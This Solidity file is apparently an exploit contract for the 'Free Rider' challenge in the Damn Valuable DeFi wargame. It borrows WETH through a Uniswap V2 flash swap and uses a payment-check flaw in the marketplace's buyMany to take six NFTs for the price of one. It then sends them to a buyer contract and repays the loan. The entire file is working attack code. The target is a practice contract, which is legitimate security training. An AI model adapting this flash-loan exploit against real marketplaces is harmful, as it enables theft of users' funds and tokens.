// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./interfaces/Uniswap.sol";

import "./FreeRiderNFTMarketplace.sol";

import "hardhat/console.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "./DamnValuableNFT.sol";

interface IWETH {
    function deposit() external payable;

    function withdraw(uint256) external;
}

contract Exploit is IUniswapV2Callee, ReentrancyGuard, IERC721Receiver {
    address immutable Factory;
    FreeRiderNFTMarketplace immutable freeRiderNFTMarketplace;
    address immutable token;
    address immutable freeRiderBuyer;
    uint256[] tokenId;
    IWETH weth;
    DamnValuableNFT public dvn;

    event Log(string message, uint256 val);

    constructor(
        address _factory,
        address _token,
        address _freeRiderNFTMarketplace,
        address _freeRiderBuyer,
        uint256[] memory _tokenId,
        address _weth
    ) public {
        Factory = _factory;
        token = _token;
        freeRiderNFTMarketplace = FreeRiderNFTMarketplace(payable(_freeRiderNFTMarketplace));
        freeRiderBuyer = _freeRiderBuyer;
        tokenId = _tokenId;
        weth = IWETH(payable(_weth));
        dvn = DamnValuableNFT(freeRiderNFTMarketplace.token());
        //console.log("constructor called");
    }

    // needs to accept ETH from any V1 exchange and WETH. ideally this could be enforced, as in the router,
    // but it's not possible because it requires a call to the v1 factory, which takes too much gas
    receive() external payable {}

    // called by pair contract
    function uniswapV2Call(
        address _sender,
        uint256 _amount0,
        uint256 _amount1,
        bytes calldata _data
    ) external override {
        //console.log("uniswapV2Call called");
        address token0 = IUniswapV2Pair(msg.sender).token0();
        address token1 = IUniswapV2Pair(msg.sender).token1();
        address pair = IUniswapV2Factory(Factory).getPair(token0, token1);
        require(msg.sender == pair, "!pair");
        require(_sender == address(this), "!sender");

        (address tokenBorrow, uint256 amount) = abi.decode(_data, (address, uint256));

        // about 0.3%
        uint256 fee = ((amount * 3) / 997) + 1;
        uint256 amountToRepay = amount + fee;

        // do stuff here
        emit Log("amount", amount);
        emit Log("amount0", _amount0);
        emit Log("amount1", _amount1);
        emit Log("fee", fee);
        emit Log("amount to repay", amountToRepay);

        // console.log("amount", amount);
        // console.log("amount0", _amount0);
        // console.log("amount1", _amount1);
        // console.log("fee", fee);
        // console.log("amount to repay", amountToRepay);
        // console.log("balance:", address(this).balance);

        weth.withdraw(15 ether);
        freeRiderNFTMarketplace.buyMany{value: 15 ether}(tokenId);
        //console.log("received the 6 tokens");

        for (uint256 i = 0; i < 6; i++) {
            // console.log("dvn.ownerOf(i)", dvn.ownerOf(i));
            // console.log("address(this)", address(this));
            dvn.safeTransferFrom(dvn.ownerOf(i), freeRiderBuyer, i);
        }

        weth.deposit{value: 20 ether}();
        IERC20(tokenBorrow).transfer(pair, amountToRepay);
    }

    function testFlashSwap(address _tokenBorrow, uint256 _amount) external payable {
        //console.log("testFlashSwap called");

        address pair = IUniswapV2Factory(Factory).getPair(_tokenBorrow, token);
        // console.log("pair1", _tokenBorrow);
        // console.log("pair2", token);
        require(pair != address(0), "!pair");

        address token0 = IUniswapV2Pair(pair).token0();
        address token1 = IUniswapV2Pair(pair).token1();
        uint256 amount0Out = _tokenBorrow == token0 ? _amount : 0;
        uint256 amount1Out = _tokenBorrow == token1 ? _amount : 0;

        // need to pass some data to trigger uniswapV2Call
        bytes memory data = abi.encode(_tokenBorrow, _amount);
        //console.log("testFlashSwap2 ");

        IUniswapV2Pair(pair).swap(amount0Out, amount1Out, address(this), data);
    }

    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory
    ) external override nonReentrant returns (bytes4) {
        //console.log("onERC721Received");
        return IERC721Receiver.onERC721Received.selector;
    }

    fallback() external {
        console.log("fallback");
    }
}
